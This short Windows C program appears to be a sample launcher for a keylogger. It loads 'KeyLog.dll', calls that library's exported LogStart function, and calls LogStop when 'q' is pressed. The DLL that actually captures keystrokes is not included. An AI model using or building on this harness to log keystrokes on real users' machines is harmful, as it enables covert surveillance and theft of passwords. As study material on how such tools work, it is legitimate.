#include <stdio.h>
#include <conio.h>
#include <Windows.h>

#define DEF_DLL_NAME "KeyLog.dll"
#define DEF_LOGSTART "LogStart"
#define DEF_LOGSTOP "LogStop"

typedef void(*PFN_LOGSTART)();
typedef void(*PFN_LOGSTOP)();

void main()
{
	HMODULE hDll = NULL;
	PFN_LOGSTART LogStart = NULL;
	PFN_LOGSTOP LogStop = NULL;
	char ch = 0;

	// loading KeyLog.dll
	hDll = LoadLibraryA(DEF_DLL_NAME);

	// get address of export function
	LogStart = (PFN_LOGSTART)GetProcAddress(hDll, DEF_LOGSTART);
	LogStop = (PFN_LOGSTOP)GetProcAddress(hDll, DEF_LOGSTOP);

	LogStart();

	printf("press 'q' to quit!\n");
	while (_getch() != 'q');

	LogStop();
	
	FreeLibrary(hDll);
}